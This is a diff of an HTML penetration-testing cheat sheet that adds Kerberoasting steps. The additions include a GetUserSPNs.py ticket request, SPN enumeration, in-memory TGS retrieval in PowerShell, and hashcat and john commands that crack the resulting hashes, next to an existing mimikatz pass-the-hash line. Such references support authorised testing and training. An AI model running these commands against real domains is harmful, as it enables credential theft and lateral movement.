@@ -680,6 +680,10 @@
 <td><code>xq &lt;filename&gt;</code> <code>cat &lt;filename&gt; | xq</code></td>
 <td>jq but for xml files!!!!!</td>
 </tr>
+<tr>
+<td><code>GetUserSPNs.py -request -dc-ip 192.168.2.160 &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt; -outputfile hashes.kerberoast </code></td>
+<td>Kerberoast users</td>
+</tr>
 </tbody>
 </table>
 <h2 id="linux-exploits">Linux exploits<a href="#linux-exploits" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
@@ -1193,12 +1197,16 @@ print(server<span style="color:#f92672">.</span>info)
 <td>powershell command to grab properties like SID, DNS hostname of a computer in a domain</td>
 </tr>
 <tr>
+<td>`Get-NetUser -SPN</td>
+<td>select serviceprincipalname `</td>
+</tr>
+<tr>
 <td><code>sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt; /run:cmd.exe</code></td>
 <td>mimkatz pass the hash (needs administrator privileges)</td>
 </tr>
 <tr>
-<td></td>
-<td></td>
+<td><code>Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;ServicePrincipalName&quot; #Example: MSSQLSvc/mgmt.domain.local </code></td>
+<td>Get TGS in memory</td>
 </tr>
 </tbody>
 </table>
@@ -1562,10 +1570,13 @@ tnscmd10g version -h &lt;IP&gt;
 <h1 id="password-cracking">Password cracking<a href="#password-cracking" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <h2 id="hashcat">Hashcat<a href="#hashcat" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -m <span style="color:#ae81ff">18200</span> --force -a <span style="color:#ae81ff">0</span> hashes.asreproast passwords_kerb.txt 
+hashcat -m <span style="color:#ae81ff">13100</span> --force -a <span style="color:#ae81ff">0</span> hashes.kerberoast rockyou.txt
 </code></pre></div><h2 id="john">John<a href="#john" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">john --wordlist<span style="color:#f92672">=</span>passwords_kerb.txt hashes.asreproast
 john hashList.txt
 john --show hashList.txt <span style="color:#75715e"># show password once hash has been cracked</span>
+
+john --format<span style="color:#f92672">=</span>krb5tgs --wordlist<span style="color:#f92672">=</span>rockyou.txt hashes.kerberoast
 </code></pre></div><h2 id="default-credentials">Default credentials<a href="#default-credentials" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <table>
 <thead>
